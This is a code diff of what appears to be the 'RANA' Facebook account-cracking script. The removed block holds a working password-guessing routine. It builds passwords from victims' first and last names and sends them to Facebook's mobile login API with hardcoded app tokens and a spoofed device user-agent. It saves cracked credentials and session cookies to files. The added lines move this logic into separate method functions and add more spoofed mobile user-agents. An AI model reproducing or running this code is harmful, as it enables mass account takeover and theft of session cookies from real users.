@@ -1,100 +1,29 @@
-import requests, random, uuid, base64, sys, time
-
-# ✅ Locale / Country setup
-code1 = code2 = code3 = code4 = "en_US"
-loc1 = loc2 = loc3 = loc4 = "US"
-
-# ✅ Dynamic User-Agent list
+# ================== [ USER AGENT SETUP ] ================== #
 ua_list = [
     "Mozilla/5.0 (Linux; Android 12; SM-A107F) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; Infinix X6811) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; TECNO KC8) AppleWebKit/537.36 Chrome/110.0.5481.153 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; vivo 1820) AppleWebKit/537.36 Chrome/114.0.5735.61 Mobile Safari/537.36"
+    "Mozilla/5.0 (Linux; Android 9; vivo 1820) AppleWebKit/537.36 Chrome/114.0.5735.61 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M115F) AppleWebKit/537.36 Chrome/96.0.4664.45 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 8.1; itel A45) AppleWebKit/537.36 Chrome/96.0.4664.45 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A115F) AppleWebKit/537.36 Chrome/89.0.4389.105 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; CPH2381) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"
 ]
 
-# ✅ Method 1 (New IDs)
-def ffb1(ids,names,passlist):
-        try:
-                global oks,cps,loop
-                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
-                        #a1 = random.choice(prox)
-                        #proxs= {'http': 'socks4://'+a1}
-                        data = {'adid': str(uuid.uuid4()),
-'format': 'json',
-'device_id': str(uuid.uuid4()),
-'cpl': 'true',
-'family_device_id': str(uuid.uuid4()),
-'credentials_type': 'device_based_login_password',
-'error_detail_type': 'button_with_disabled',
-'source': 'register_api',
-'email': ids,
-'password': pas,
-'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
-'generate_session_cookies': '1',
-'meta_inf_fbmeta': 'NO_FILE',
-'advertiser_id': str(uuid.uuid4()),
-'currently_logged_in_userid': '0',
-'locale': code1,
-'client_country_code': loc1,
-'method': 'auth.login',
-'fb_api_req_friendly_name': 'authenticate',
-'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-'api_key': '882a8490361da98702bf97a021ddc14d',
-'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
-                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
-'X-FB-Net-HNI': '20083',
-'User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
-'X-FB-Client-IP': 'True',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-SIM-HNI': '37460',
-'X-Tigon-Is-Retry': 'False',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Connection-Quality': 'MOBILE.LTE',
-'X-FB-Server-Cluster': 'True',
-'Connection': 'keep-alive',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Host': 'graph.facebook.com',
-'X-FB-Connection-Bandwidth': '80025933',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'Accept-Encoding': 'gzip, deflate',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'Content-Type': 'application/x-www-form-urlencoded'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                                        cookies = f"sb={ssbb};{coki}"
-                                        #print(f' Cookie: \033[1;32m'+cookies)
-                                        open('/sdcard/RANA/RANA-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
-                                        open('/sdcard/RANA/RANA-M1-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                        else:
-                                        continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-        	time.sleep(20)
-        except Exception as e:
-        	time.sleep(20)
+# ================== [ METHOD SETUP ] ================== #
+def ffb1(ids,names,passlist): 
+    from main_methods import run_method1
+    run_method1(ids,names,passlist,ua_list)
 
-# ✅ Method 2, 3, 4 – duplicate of ffb1, but use different locale/code if needed
-def ffb2(ids,names,passlist): ffb1(ids,names,passlist)
-def ffb3(ids,names,passlist): ffb1(ids,names,passlist)
-def ffb4(ids,names,passlist): ffb1(ids,names,passlist)
+def ffb2(ids,names,passlist): 
+    from main_methods import run_method2
+    run_method2(ids,names,passlist,ua_list)
+
+def ffb3(ids,names,passlist): 
+    from main_methods import run_method3
+    run_method3(ids,names,passlist,ua_list)
+
+def ffb4(ids,names,passlist): 
+    from main_methods import run_method4
+    run_method4(ids,names,passlist,ua_list)
